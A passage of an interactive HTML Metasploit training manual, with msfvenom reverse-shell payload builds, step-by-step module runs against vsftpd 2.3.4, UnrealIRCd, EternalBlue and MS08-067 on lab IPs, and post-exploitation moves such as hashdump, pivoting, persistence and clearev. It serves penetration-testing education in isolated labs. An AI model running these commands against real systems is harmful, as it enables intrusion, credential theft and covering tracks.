+    <p><code>windows/x64/meterpreter/reverse_tcp</code> = platform / arch / kind / transport. Slashes (<code>/</code>) mean <b>staged</b> (stager + stage); underscores (<code>meterpreter_reverse_tcp</code>) mean <b>stageless</b> (one blob).</p>
+    <table class="spec"><tr><th>Axis</th><th>Option A</th><th>Option B</th><th>Rule of thumb</th></tr>
+    <tr><td>Size</td><td><b>Staged</b> — tiny stager phones home, pulls big stage</td><td><b>Stageless</b> — all-in-one, bigger</td><td>Tiny buffer → staged; roomy → stageless (fewer round-trips, more robust)</td></tr>
+    <tr><td>Direction</td><td><b>Bind</b> — victim listens, you connect in</td><td><b>Reverse</b> — you listen, victim calls back</td><td>Firewalled victim inbound → reverse; you can't receive → bind</td></tr>
+    <tr><td>Kind</td><td><b>shell</b> — raw cmd.exe / /bin/sh</td><td><b>Meterpreter</b> — in-memory agent: migrate, hashdump, upload/download, pivot</td><td>Learn Meterpreter; fall back to shell when stealth/size demands</td></tr></table>
+    <div class="stage"><h5>◉ ANIMATED: BIND vs REVERSE — CLICK TO SWITCH</h5>
+      <div class="toggle-row"><button id="btnBind">◉ BIND SHELL</button><button id="btnRev" class="on">◉ REVERSE SHELL</button></div>
+      <div class="nodes">
+        <div class="node attacker"><div class="ico">🐉</div><b>KALI (you)</b><small id="leftRole">LISTENER :4444</small></div>
+        <div class="pipe" id="shellPipe"><div class="packet rev" id="shellPacket"></div><div class="lane-labels"><span>kali</span><span id="dirLabel">◀ victim calls back</span><span>victim</span></div></div>
+        <div class="node victim"><div class="ico">🖥️</div><b>VICTIM</b><small id="rightRole">connects out</small></div>
+      </div>
+      <div class="hint" id="shellHint">REVERSE: LHOST=your Kali IP, multi/handler listens. Victim egress usually allowed → most reliable in labs.</div>
+    </div>
+    <div class="stage"><h5>◉ ANIMATED: STAGED (2 TRIPS) vs STAGELESS (1 TRIP)</h5>
+      <div class="nodes">
+        <div class="node attacker"><div class="ico">🐉</div><b>KALI</b><small>handler</small></div>
+        <div class="pipe"><div class="packet stager"></div><div class="lane-labels"><span>trip 1: 300-byte stager</span><span>→</span></div></div>
+        <div class="node victim"><div class="ico">🖥️</div><b>VICTIM</b><small>receives…</small></div>
+        <div class="pipe"><div class="packet stage2" style="animation-duration:4s"></div><div class="lane-labels"><span>trip 2: full Meterpreter stage</span><span>→</span></div></div>
+        <div class="node net"><div class="ico">📦</div><b>STAGELESS</b><small>single 800KB blob, no trip 2</small></div>
+      </div>
+      <div class="hint">Small gold dot = stager · Big green block = stage. Stageless skips trip 2 but needs a bigger initial hole.</div>
+    </div>
+    <h3>3.2 Meterpreter: the agent, not the exploit</h3>
+    <p>Client (DLL) lives <b>in memory</b> on the victim; Ruby server in the framework drives it. Core + extensions: <code>sysinfo · getuid · ps · migrate · hashdump · upload/download · shell · portfwd/route</code>. Dies with the process unless you <code>migrate</code>.</p>
+    <h3>3.3 msfvenom — build standalone payloads</h3>
+<pre class="code"><span class="d"># list payloads / formats / encoders</span>
+<span class="g">msfvenom -l payloads | grep -i meterpreter</span>
+<span class="g">msfvenom -l formats</span>   <span class="d"># exe, elf, raw, war, aspx, ps1…</span>
+<span class="d"># Linux stageless reverse shell (lab only):</span>
+<span class="g">msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f elf -o /tmp/lab.elf</span>
+<span class="d"># Windows staged reverse over TCP:</span>
+<span class="g">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o /tmp/lab.exe</span>
+<span class="y"># catch it with:</span>  <span class="g">use exploit/multi/handler; set PAYLOAD &lt;same&gt;; set LHOST …; run</span></pre>
+    <div class="callout warn"><b class="tag">⚠ ENCODER MYTH</b> <code>-e x86/shikata_ga_nai -i 3</code> dodges <i>bad characters</i>, not modern AV/EDR. Treat encoding as a size/format tool, never as "FUD".</div>
+    <div class="terminal"><div class="term-bar"><i class="dot r"></i><i class="dot y"></i><i class="dot g"></i><span class="t">operator@kali: msfvenom + handler simulator</span></div>
+      <div class="term-body" id="term3"></div>
+      <div class="term-controls"><button data-term="term3" data-demo="venom">▶ Run demo</button><button class="ghost" data-term="term3" data-demo="clear">Clear</button><input class="cmd-input" data-for="term3" placeholder="try: use exploit/multi/handler"></div>
+    </div>
+    <div class="quiz" data-quiz="3" data-need="2">
+      <h4>▣ VALIDATION 3 — PAYLOADS CHECK</h4>
+      <div class="q" data-answer="1"><p>1. windows/meterpreter/reverse_tcp vs windows/meterpreter_reverse_tcp?</p><label><input type="radio" name="q3a" value="0"> Identical</label><label><input type="radio" name="q3a" value="1"> Slashes = staged (stager+stage); underscore = stageless (single blob)</label><label><input type="radio" name="q3a" value="2"> Underscore means bind shell</label><div class="qres"></div></div>
+      <div class="q" data-answer="0"><p>2. When is reverse shell usually better than bind?</p><label><input type="radio" name="q3b" value="0"> When inbound connections to the victim are blocked but outbound callbacks reach you</label><label><input type="radio" name="q3b" value="1"> When you have no IP address</label><label><input type="radio" name="q3b" value="2"> Never</label><div class="qres"></div></div>
+      <div class="q" data-answer="2"><p>3. Meterpreter is…</p><label><input type="radio" name="q3c" value="0"> An exploit for SMB</label><label><input type="radio" name="q3c" value="1"> An antivirus</label><label><input type="radio" name="q3c" value="2"> An in-memory post-exploitation agent/session type</label><div class="qres"></div></div>
+      <button class="quiz-btn">Validate knowledge →</button><span class="pass-badge">✔ PASSED — Level 4 unlocked</span><span class="fail-badge">✘ Need ≥ 2/3</span>
+    </div>
+    <div class="chapnav"><button data-goto="2">← Level 2</button><button data-goto="4">Next: Level 4 — Workflow ↓</button></div>
+  </div>
+</div>
+</section>
+
+<!-- ============ CHAPTER 4 ============ -->
+<section class="chapter" data-chap="4">
+<div class="manual-sheet">
+  <div class="sheet-head"><span class="docno">TM-2600-MSF §4</span><h2>Level 4 — The Exploitation Workflow (The Six Moves)</h2></div>
+  <div class="sheet-meta"><span>CLEARANCE: CONTROLLER</span><span>OBJECTIVE: RUN CLEAN KILL-CHAINS</span></div>
+  <div class="sheet-body">
+    <h3>4.1 The loop professionals never skip</h3>
+    <div class="stage"><h5>◉ ANIMATED: SEARCH → USE → SHOW → SET → CHECK → RUN → SESSIONS</h5>
+      <div class="timeline" id="workflowTimeline">
+        <div class="tstep"><div class="tnum">S</div><div class="tcard"><code>search type:exploit smb</code> — find candidates, read <code>Rank</code> + <code>DisclosureDate</code>.</div></div>
+        <div class="tstep"><div class="tnum">U</div><div class="tcard"><code>use exploit/…</code> + <code>info</code> — read description, references (CVE), side effects.</div></div>
+        <div class="tstep"><div class="tnum">O</div><div class="tcard"><code>show options / show targets / show payloads</code> — learn required <code>RHOSTS LHOST</code>.</div></div>
+        <div class="tstep"><div class="tnum">C</div><div class="tcard"><code>check</code> — ask "are you vulnerable?" when supported. Scanner-first for EternalBlue!</div></div>
+        <div class="tstep"><div class="tnum">R</div><div class="tcard exploit-flash"><code>run</code> (or <code>exploit -z</code>) — fire. Snapshot first; <code>Manual</code> rank may crash target.</div></div>
+        <div class="tstep"><div class="tnum">↔</div><div class="tcard"><code>sessions -l · sessions -i 1 · background · sessions -k</code> — manage shells.</div></div>
+      </div>
+      <div class="hint">Golden rule: <b>scan with auxiliary → verify with check → only then exploit a disposable snapshot.</b></div>
+    </div>
+    <h3>4.2 Full live drill (simulated)</h3>
+    <div class="terminal"><div class="term-bar"><i class="dot r"></i><i class="dot y"></i><i class="dot g"></i><span class="t">operator@kali: full kill-chain drill</span></div>
+      <div class="term-body" id="term4"></div>
+      <div class="term-controls"><button data-term="term4" data-demo="killchain">▶ Run full drill</button><button class="ghost" data-term="term4" data-demo="clear">Clear</button><input class="cmd-input" data-for="term4" placeholder="msf6 > try: search / use / show options / run"></div>
+    </div>
+<pre class="code"><span class="d">msf6 &gt;</span> <span class="g">search type:auxiliary smb_ms17_010</span>
+<span class="d">msf6 &gt;</span> <span class="g">use auxiliary/scanner/smb/smb_ms17_010</span>
+<span class="d">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt;</span> <span class="g">set RHOSTS 192.168.56.20</span>
+<span class="d">msf6 auxiliary(…) &gt;</span> <span class="g">show options</span>  <span class="d"># confirm RHOSTS/RPORT/THREADS</span>
+<span class="d">msf6 auxiliary(…) &gt;</span> <span class="g">run</span>           <span class="d"># scanner-first: patch missing? DoublePulsar?</span>
+<span class="d"># ONLY on disposable unpatched lab image:</span>
+<span class="d">msf6 &gt;</span> <span class="g">use exploit/windows/smb/ms17_010_eternalblue</span>
+<span class="d">msf6 exploit(…) &gt;</span> <span class="g">set RHOSTS 192.168.56.20</span> <span class="g">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span>
+<span class="d">msf6 exploit(…) &gt;</span> <span class="g">set LHOST 192.168.56.10</span> <span class="g">check</span> <span class="d"># if supported</span>
+<span class="d">msf6 exploit(…) &gt;</span> <span class="g">run</span>
+<span class="d">meterpreter &gt;</span> <span class="g">sysinfo</span>  <span class="g">getuid</span>  <span class="g">background</span>
+<span class="d">msf6 &gt;</span> <span class="g">sessions -l</span></pre>
+    <div class="quiz" data-quiz="4" data-need="2">
+      <h4>▣ VALIDATION 4 — WORKFLOW CHECK</h4>
+      <div class="q" data-answer="0"><p>1. Correct order?</p><label><input type="radio" name="q4a" value="0"> search → use → show options → set → check → run → sessions</label><label><input type="radio" name="q4a" value="1"> run → search → set → delete logs</label><label><input type="radio" name="q4b" value="2"> set LHOST → hack → reboot</label><div class="qres"></div></div>
+      <div class="q" data-answer="1"><p>2. What does RHOSTS mean? LHOST?</p><label><input type="radio" name="q4c" value="0"> Both are your IP</label><label><input type="radio" name="q4d" value="1"> RHOSTS = remote target(s); LHOST = your callback/listener IP</label><label><input type="radio" name="q4e" value="2"> RHOSTS = router password</label><div class="qres"></div></div>
+      <div class="q" data-answer="1"><p>3. How do you list and re-enter sessions?</p><label><input type="radio" name="q4f" value="0"> sessions --delete-everything</label><label><input type="radio" name="q4g" value="1"> sessions -l to list, sessions -i &lt;id&gt; to interact, background to detach</label><label><input type="radio" name="q4h" value="2"> Close the terminal</label><div class="qres"></div></div>
+      <button class="quiz-btn">Validate knowledge →</button><span class="pass-badge">✔ PASSED — Level 5 unlocked</span><span class="fail-badge">✘ Need ≥ 2/3</span>
+    </div>
+    <div class="chapnav"><button data-goto="3">← Level 3</button><button data-goto="5">Next: Level 5 — Real Exploits ↓</button></div>
+  </div>
+</div>
+</section>
+
+<!-- ============ CHAPTER 5 ============ -->
+<section class="chapter" data-chap="5">
+<div class="manual-sheet">
+  <div class="sheet-head"><span class="docno">TM-2600-MSF §5</span><h2>Level 5 — Real Exploits, Dissected</h2></div>
+  <div class="sheet-meta"><span>CLEARANCE: ARCHITECT</span><span>OBJECTIVE: UNDERSTAND THREE CLASSICS</span></div>
+  <div class="sheet-body">
+    <div class="callout warn"><b class="tag">⚠ LAB ONLY</b> All three targets below are <b>deliberately vulnerable lab VMs</b> (Metasploitable 2 / disposable unpatched Windows). Never replay against real hosts.</div>
+    <h3>5.1 Case A — vsftpd 2.3.4 backdoor · CVE-2011-2523 <span class="stamp green">EASIEST</span><span class="stamp blue">LINUX</span></h3>
+    <p>The <b>distributed source archive</b> of vsftpd 2.3.4 was trojaned: any username ending in <code>:)</code> triggered a bind shell on <b>TCP/6200</b>. Not a bug in clean builds — a <b>backdoored tarball</b>. Metasploitable 2 ships the tainted version on port 21.</p>
+<pre class="code"><span class="d">msf6 &gt;</span> <span class="g">search vsftpd</span>   <span class="d"># → exploit/unix/ftp/vsftpd_234_backdoor</span>
+<span class="d">msf6 &gt;</span> <span class="g">use exploit/unix/ftp/vsftpd_234_backdoor</span>
+<span class="d">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt;</span> <span class="g">info</span>   <span class="d"># read: backdoor, port 6200, CVE-2011-2523</span>
+<span class="d">msf6 exploit(…) &gt;</span> <span class="g">set RHOSTS 192.168.56.20</span> <span class="g">show options</span> <span class="g">run</span>
+<span class="d">[*] 192.168.56.20:21 - Banner: 220 (vsFTPd 2.3.4)</span>
+<span class="d">[*] 192.168.56.20:21 - USER: 331 Please specify the password.</span>
+<span class="d">[+] 192.168.56.20:6200 - Backdoor service has been spawned, handling…</span>
+<span class="d">[+] Found shell.  → whoami → <span class="g">root</span></span></pre>
+    <div class="stage"><h5>◉ ANIMATED: BACKDOOR TRIGGER (port 21 → shell on 6200)</h5>
+      <div class="nodes"><div class="node attacker"><div class="ico">🐉</div><b>KALI</b><small>USER evil:)</small></div><div class="pipe"><div class="packet"></div><div class="lane-labels"><span>:21 trigger</span><span>→</span></div></div><div class="node victim"><div class="ico">🐧</div><b>vsftpd 2.3.4</b><small>tainted build</small></div><div class="pipe"><div class="packet rev"></div><div class="lane-labels"><span>:6200 shell</span><span>→</span></div></div><div class="node net"><div class="ico">💀</div><b>ROOT SHELL</b><small>uid=0</small></div></div>
+      <div class="hint">Smiley <code>:)</code> in USER = secret knock. Lesson: verify software supply chain, not just banners.</div>
+    </div>
+    <h3>5.2 Case B — UnrealIRCd 3.2.8.1 backdoor · CVE-2010-2075 <span class="stamp green">EASY</span><span class="stamp blue">LINUX · IRC 6667</span></h3>
+    <p>Same pattern: the <b>download mirror</b> for UnrealIRCd 3.2.8.1 was trojaned for months. Sending <code>AB; <i>command</i></code> after connect executes shell as the IRC user. Metasploitable 2 runs it on <b>6667</b>.</p>
+<pre class="code"><span class="d">msf6 &gt;</span> <span class="g">search unrealircd</span>  <span class="d"># → exploit/unix/irc/unreal_ircd_3281_backdoor</span>
+<span class="d">msf6 &gt;</span> <span class="g">use exploit/unix/irc/unreal_ircd_3281_backdoor</span>
+<span class="d">msf6 exploit(…) &gt;</span> <span class="g">set RHOSTS 192.168.56.20</span> <span class="g">set PAYLOAD cmd/unix/reverse</span>
+<span class="d">msf6 exploit(…) &gt;</span> <span class="g">set LHOST 192.168.56.10</span> <span class="g">run</span>
+<span class="d">[*] Connected to 192.168.56.20:6667… [*] Sending backdoor command…</span>
+<span class="d">[+] Command shell session 1 opened</span></pre>
+    <h3>5.3 Case C — EternalBlue · MS17-010 (CVE-2017-0144) <span class="stamp">DANGEROUS</span><span class="stamp blue">WINDOWS SMB</span></h3>
+    <p>Microsoft bulletin <b>MS17-010</b> patched SMBv1 RCE: crafted messages overflow the server kernel pool → remote code as SYSTEM. The leaked <b>EternalBlue</b> technique weaponized it (WannaCry, 2017). Metasploit ships <b>both</b> a safe <code>auxiliary/scanner/smb/smb_ms17_010</code> (checks patch + DoublePulsar) <b>and</b> <code>exploit/windows/smb/ms17_010_eternalblue</code> (many Windows 7 / Server 2008 targets — can <b>BSOD</b>; disposable snapshot mandatory).</p>
+    <div class="stage"><h5>◉ ANIMATED: ETERNALBLUE — SCAN FIRST, THEN (OPTIONAL) EXPLOIT</h5>
+      <div class="timeline">
+        <div class="tstep"><div class="tnum">✓</div><div class="tcard"><code>auxiliary/scanner/smb/smb_ms17_010</code> → "Host is likely VULNERABLE to MS17-010!" or "Patched". <b>Stop here if patched.</b></div></div>
+        <div class="tstep"><div class="tnum">!</div><div class="tcard">Snapshot VM → <code>use exploit/windows/smb/ms17_010_eternalblue</code> → set RHOSTS/LHOST/PAYLOAD → <code>check</code> → <code>run</code> → <code>meterpreter &gt; sysinfo</code> shows <b>NT AUTHORITY\SYSTEM</b>.</div></div>
+      </div>
+      <div class="bar-anim"><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i></div>
+      <div class="hint">Patched Win10 = not vulnerable. Verify build + SMBv1 + patch state; module targets vary by Framework version — trust local <code>search</code>.</div>
+    </div>
+    <div class="terminal"><div class="term-bar"><i class="dot r"></i><i class="dot y"></i><i class="dot g"></i><span class="t">operator@kali: real-exploit drill simulator</span></div>
+      <div class="term-body" id="term5"></div>
+      <div class="term-controls"><button data-term="term5" data-demo="realex">▶ Run vsftpd drill</button><button class="ghost" data-term="term5" data-demo="clear">Clear</button><input class="cmd-input" data-for="term5" placeholder="try: search unrealircd"></div>
+    </div>
+    <div class="quiz" data-quiz="5" data-need="2">
+      <h4>▣ VALIDATION 5 — REAL EXPLOITS CHECK</h4>
+      <div class="q" data-answer="0"><p>1. vsftpd 2.3.4's "vuln" was…</p><label><input type="radio" name="q5a" value="0"> A backdoored release tarball (":)" trigger → shell on 6200, CVE-2011-2523)</label><label><input type="radio" name="q5b" value="1"> A weak password "admin"</label><label><input type="radio" name="q5c" value="2"> A firewall misconfig only</label><div class="qres"></div></div>
+      <div class="q" data-answer="1"><p>2. Safe EternalBlue workflow?</p><label><input type="radio" name="q5d" value="0"> Fire the exploit at any Windows box immediately</label><label><input type="radio" name="q5e" value="1"> Run the smb_ms17_010 scanner first on an isolated lab VM; exploit only a disposable unpatched snapshot</label><label><input type="radio" name="q5f" value="2"> Disable your firewall and hope</label><div class="qres"></div></div>
+      <div class="q" data-answer="2"><p>3. UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) came from…</p><label><input type="radio" name="q5g" value="0"> A kernel bug</label><label><input type="radio" name="q5h" value="1"> A SQL injection</label><label><input type="radio" name="q5i" value="2"> A trojaned download archive; "AB; cmd" executes on IRC port 6667</label><div class="qres"></div></div>
+      <button class="quiz-btn">Validate knowledge →</button><span class="pass-badge">✔ PASSED — Level 6 unlocked</span><span class="fail-badge">✘ Need ≥ 2/3</span>
+    </div>
+    <div class="chapnav"><button data-goto="4">← Level 4</button><button data-goto="6">Next: Level 6 — Labs ↓</button></div>
+  </div>
+</div>
+</section>
+
+<!-- ============ CHAPTER 6 ============ -->
+<section class="chapter" data-chap="6">
+<div class="manual-sheet">
+  <div class="sheet-head"><span class="docno">TM-2600-MSF §6</span><h2>Level 6 — Testing Labs on Real Operating Systems</h2></div>
+  <div class="sheet-meta"><span>CLEARANCE: LAB RAT → ENGINEER</span><span>RANGE: HOST-ONLY 192.168.56.0/24</span></div>
+  <div class="sheet-body">
+    <div class="callout warn"><b class="tag">⚠ RANGE SAFETY</b> VirtualBox/VMware → all VMs on <b>Host-only / Internal</b> network, <b>no bridged/NAT-exposed</b> vulnerable VM. <b>Snapshot every VM before firing anything.</b> Kali = <code>192.168.56.10</code>, victims = <code>.20+</code>.</div>
+    <div class="tabs" id="labTabs">
+      <button data-tab="t-kali" class="on">🐉 Kali (attacker)</button>
+      <button data-tab="t-m2">🐧 Metasploitable 2</button>
+      <button data-tab="t-m3">🪟 Metasploitable 3</button>
+      <button data-tab="t-win">💽 Win XP / 7 (isolated)</button>
+    </div>
+    <div class="tabpane on" id="t-kali">
+      <h4>Attacker — Kali Linux (2024.x, NAT for updates + Host-only for range)</h4>
+      <ul><li>2 vCPU / 4 GB RAM. Two NICs: NAT (internet) + Host-only <code>192.168.56.10</code> (range).</li><li>Tools: <code>msfconsole · msfvenom · nmap · wireshark · postgresql</code>.</li><li>Verify: <code>ip a</code> shows 192.168.56.10; <code>nmap -Sn 192.168.56.0/24</code> finds victims; <code>db_status</code> connected.</li></ul>
+<pre class="code"><span class="g">sudo apt update && sudo apt install -y metasploit-framework nmap</span>
+<span class="g">sudo msfdb init && msfconsole -q</span>
+<span class="d">msf6 &gt;</span> <span class="g">db_nmap -sV -O 192.168.56.20</span>  <span class="d"># store results in DB</span>
+<span class="d">msf6 &gt;</span> <span class="g">hosts; services; vulns</span></pre>
+    </div>
+    <div class="tabpane" id="t-m2">
+      <h4>Victim A — Metasploitable 2 (Ubuntu 8.04, intentionally vulnerable)</h4>
+      <p>Rapid7's classic training image. Credentials <code>msfadmin:msfadmin</code>. Services: FTP 21 (vsftpd 2.3.4), SSH 22, Telnet 23, SMTP 25, HTTP 80 (DVWA), IRC 6667 (UnrealIRCd), SMB 445 (Samba), MySQL 3306, Postgres 5432, VNC, etc.</p>
+<pre class="code"><span class="d"># recon from Kali:</span>
+<span class="g">nmap -sV -p21,22,80,445,6667,3306 192.168.56.20</span>
+<span class="d"># 21/tcp vsftpd 2.3.4 · 6667/tcp UnrealIRCd 3.2.8.1 · 445/tcp Samba 3.X</span>
+<span class="d"># then: vsftpd_234_backdoor (§5.1) and unreal_ircd_3281_backdoor (§5.2)</span></pre>
+      <p><span class="stamp green">BEST FIRST TARGET</span> Stable, documented, instant wins. Keep it host-only — it is trivially rootable.</p>
+    </div>
+    <div class="tabpane" id="t-m3">
+      <h4>Victim B — Metasploitable 3 (Win Server 2008 R2 / Ubuntu 14.04, built with Packer/Vagrant)</h4>
+      <p>Modern follow-up: build scripts install GlassFish, Jenkins, Struts, SMB shares, weak configs. Windows build exercises <code>smb_ms17_010</code> scanner logic, EternalBlue-era SMB, psexec-style <code>exploit/windows/smb/psexec</code> with harvested creds, plus Linux Tomcat/ProFTPD paths.</p>
+<pre class="code"><span class="d">msf6 &gt;</span> <span class="g">use auxiliary/scanner/smb/smb_version</span>
+<span class="d">msf6 &gt;</span> <span class="g">set RHOSTS 192.168.56.21</span> <span class="g">run</span>
+<span class="d">msf6 &gt;</span> <span class="g">use auxiliary/scanner/http/tomcat_mgr_login</span>  <span class="d"># Jenkins/Tomcat creds</span></pre>
+      <p><span class="stamp blue">REALISTIC</span> Closer to enterprise estates than M2; heavier (4 GB+ RAM per VM).</p>
+    </div>
+    <div class="tabpane" id="t-win">
+      <h4>Victim C — Windows XP SP3 / 7 SP1 (licensed, unpatched, disposable)</h4>
+      <ul><li><b>XP SP3:</b> classic stack overflows (e.g. MS08-067 <code>exploit/windows/smb/ms08_067_netapi</code>), IE bugs. No patches, no network beyond host-only, snapshot, destroy after.</li><li><b>7 SP1 unpatched:</b> MS17-010 scanner target; EternalBlue module lists Win7 x64 targets but <b>may BSOD</b> — snapshot + expect crashes.</li><li><b>Win 10 patched:</b> use as <b>negative control</b> — scanner says patched; exploit fails. That <i>is</i> the lesson.</li></ul>
+<pre class="code"><span class="d"># XP-era classic (isolated XP SP3 only):</span>
+<span class="d">msf6 &gt;</span> <span class="g">use exploit/windows/smb/ms08_067_netapi</span>
+<span class="d">msf6 exploit(…) &gt;</span> <span class="g">show targets</span>  <span class="d"># pick exact XP SP3 English</span>
+<span class="d">msf6 exploit(…) &gt;</span> <span class="g">set RHOSTS 192.168.56.22</span> <span class="g">set PAYLOAD windows/meterpreter/reverse_tcp</span>
+<span class="d">msf6 exploit(…) &gt;</span> <span class="g">set LHOST 192.168.56.10</span> <span class="g">check</span> <span class="g">run</span></pre>
+    </div>
+    <h3>6.1 Range build checklist (click to tick — stored locally)</h3>
+    <div class="quiz" id="checklistBox" style="background:#eef6ff">
+      <label><input type="checkbox" data-cl="0"> Kali has Host-only IP 192.168.56.10 (<code>ip a</code>)</label>
+      <label><input type="checkbox" data-cl="1"> Victims on Host-only/Internal, NOT bridged</label>
+      <label><input type="checkbox" data-cl="2"> Snapshots taken of every victim VM</label>
+      <label><input type="checkbox" data-cl="3"> <code>nmap -Sn 192.168.56.0/24</code> sees victims from Kali</label>
+      <label><input type="checkbox" data-cl="4"> <code>db_status</code> connected in msfconsole</label>
+      <div class="qres" id="clRes" style="font-family:var(--mono)"></div>
+    </div>
+    <div class="quiz" data-quiz="6" data-need="2">
+      <h4>▣ VALIDATION 6 — LABS CHECK</h4>
+      <div class="q" data-answer="1"><p>1. Correct lab networking?</p><label><input type="radio" name="q6a" value="0"> Bridge vulnerable VMs to the internet for realism</label><label><input type="radio" name="q6b" value="1"> Host-only/internal range (e.g. 192.168.56.0/24) + snapshots, Kali .10</label><label><input type="radio" name="q6c" value="2"> One laptop, no VMs needed</label><div class="qres"></div></div>
+      <div class="q" data-answer="0"><p>2. Metasploitable 2 runs…</p><label><input type="radio" name="q6d" value="0"> Intentionally vulnerable Ubuntu 8.04 with vsftpd 2.3.4, UnrealIRCd, Samba… (msfadmin:msfadmin)</label><label><input type="radio" name="q6e" value="1"> A hardened banking server</label><label><input type="radio" name="q6f" value="2"> Windows 11</label><div class="qres"></div></div>
+      <div class="q" data-answer="2"><p>3. Before firing EternalBlue/MS08-067 on Windows VMs?</p><label><input type="radio" name="q6g" value="0"> Nothing special</label><label><input type="radio" name="q6h" value="1"> Post results on social media</label><label><input type="radio" name="q6i" value="2"> Snapshot first; expect crashes/BSOD; scanner-first; isolated disposable VM</label><div class="qres"></div></div>
+      <button class="quiz-btn">Validate knowledge →</button><span class="pass-badge">✔ PASSED — Level 7 unlocked</span><span class="fail-badge">✘ Need ≥ 2/3</span>
+    </div>
+    <div class="chapnav"><button data-goto="5">← Level 5</button><button data-goto="7">Next: Level 7 — Post-Exploitation ↓</button></div>
+  </div>
+</div>
+</section>
+
+<!-- ============ CHAPTER 7 ============ -->
+<section class="chapter" data-chap="7">
+<div class="manual-sheet">
+  <div class="sheet-head"><span class="docno">TM-2600-MSF §7</span><h2>Level 7 — Post-Exploitation: Meterpreter, Pivoting & Loot</h2></div>
+  <div class="sheet-meta"><span>CLEARANCE: HERO (FINAL)</span><span>OBJECTIVE: FINISH THE MISSION CLEANLY</span></div>
+  <div class="sheet-body">
+    <h3>7.1 You have a session. Now what?</h3>
+    <table class="spec"><tr><th>Goal</th><th>Meterpreter / post moves</th></tr>
+    <tr><td>Orient</td><td><code>sysinfo · getuid · pwd · ps · ipconfig/ifconfig · netstat</code></td></tr>
+    <tr><td>Stabilize</td><td><code>migrate &lt;pid&gt;</code> (e.g. to explorer.exe), <code>background</code>, <code>sessions -i</code></td></tr>
+    <tr><td>Escalate</td><td><code>getsystem</code>, <code>post/windows/escalate/*</code>, <code>hashdump</code> (SYSTEM needed)</td></tr>
+    <tr><td>Loot</td><td><code>download / upload</code>, <code>search -f *.kdbx</code>, <code>post/*/gather/*</code>, screenshot/keyscan in labs</td></tr>
+    <tr><td>Pivot</td><td><code>route add</code> + <code>auxiliary/server/socks_proxy</code>, <code>portfwd add -l 3389 -p 3389 -r victim</code></td></tr>
+    <tr><td>Persist (lab)</td><td><code>post/windows/manage/*</code> demos — then <b>remove + revert snapshot</b></td></tr>
+    <tr><td>Clean</td><td><code>clearev</code> (lab), kill sessions, <b>restore snapshots</b>, write report</td></tr></table>
+    <div class="terminal"><div class="term-bar"><i class="dot r"></i><i class="dot y"></i><i class="dot g"></i><span class="t">meterpreter: post-exploitation simulator</span></div>
+      <div class="term-body" id="term7"></div>
+      <div class="term-controls"><button data-term="term7" data-demo="meter">▶ Run demo</button><button class="ghost" data-term="term7" data-demo="clear">Clear</button><input class="cmd-input" data-for="term7" placeholder="meterpreter > try: sysinfo"></div>
+    </div>
+    <h3>7.2 Opsec & reporting — the hero's difference</h3>
+    <div class="callout ok"><b class="tag">HERO PROTOCOL</b> Scope in writing → snapshot → scanner/check first → least-invasive payload → <code>background</code>, don't carpet-bomb → loot only what proves impact → <b>restore snapshots, remove persistence, report with reproducible <code>info/run</code> steps + remediation</b> (patch MS17-010, replace tainted builds, disable SMBv1, segment networks).</div>
+    <div class="quiz" data-quiz="7" data-need="3">
+      <h4>▣ FINAL HERO EXAM — 3/3 REQUIRED (no mercy)</h4>
+      <div class="q" data-answer="0"><p>1. First thing after getting a Meterpreter session?</p><label><input type="radio" name="q7a" value="0"> Orient + stabilize: sysinfo/getuid/ps, migrate to stable process, background</label><label><input type="radio" name="q7b" value="1"> Immediately install ransomware</label><label><input type="radio" name="q7c" value="2"> Delete the VM disk</label><div class="qres"></div></div>
+      <div class="q" data-answer="2"><p>2. Correct pivot pattern?</p><label><input type="radio" name="q7d" value="0"> Publish victim IP publicly</label><label><input type="radio" name="q7e" value="1"> Guess passwords forever</label><label><input type="radio" name="q7f" value="2"> route add through session + socks_proxy / portfwd to reach inner hosts</label><div class="qres"></div></div>
+      <div class="q" data-answer="1"><p>3. Proper end of a lab engagement?</p><label><input type="radio" name="q7g" value="0"> Leave backdoors for later</label><label><input type="radio" name="q7h" value="1"> clearev, remove persistence, restore snapshots, report reproducibly + remediation</label><label><input type="radio" name="q7i" value="2"> Wipe all logs including the lab host's</label><div class="qres"></div></div>
+      <button class="quiz-btn">Claim HERO rank →</button><span class="pass-badge">🏆 HERO CONFIRMED — manual complete!</span><span class="fail-badge">✘ Need 3/3 — a hero doesn't guess</span>
+    </div>
+    <div id="heroCert" style="display:none;border:3px solid var(--ok);border-radius:10px;padding:18px;background:#ecfdf3;margin-top:14px">
+      <h3 style="border:none;padding:0">🏆 Certificate of Exploitation Literacy</h3>
+      <p>This operator completed TM-2600-MSF, understands modular exploitation, payload tradecraft, scanner-first discipline, three real CVEs, isolated multi-OS labs and clean post-exploitation.</p>
+      <p style="font-family:var(--mono)" id="certLine"></p>
+    </div>
+    <div class="chapnav"><button data-goto="6">← Level 6</button><button data-goto="0">⌂ Home (index.html)</button></div>
+  </div>
+</div>
+
+<div class="manual-sheet">
+  <div class="sheet-head"><span class="docno">APPENDIX X</span><h2>External Sources & Further Reading</h2></div>
+  <div class="sheet-meta"><span>VERIFY EVERYTHING — MODULE PATHS CHANGE PER RELEASE</span></div>
+  <div class="sheet-body">
+    <ol class="sources">
+      <li>Rapid7 — Metasploit codebase structure: <a href="https://docs.metasploit.com/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html">docs.metasploit.com … codebase</a></li>
+      <li>Rapid7 — Running modules (search/use/run): <a href="https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html">using-metasploit</a></li>
+      <li>Rapid7 — How payloads work: <a href="https://docs.metasploit.com/docs/using-metasploit/basics/how-payloads-work.html">how-payloads-work</a></li>
+      <li>Rapid7 — Meterpreter staged vs stageless: <a href="https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html">stageless-mode</a></li>
+      <li>Rapid7 — Meterpreter architecture: <a href="https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html">meterpreter</a></li>
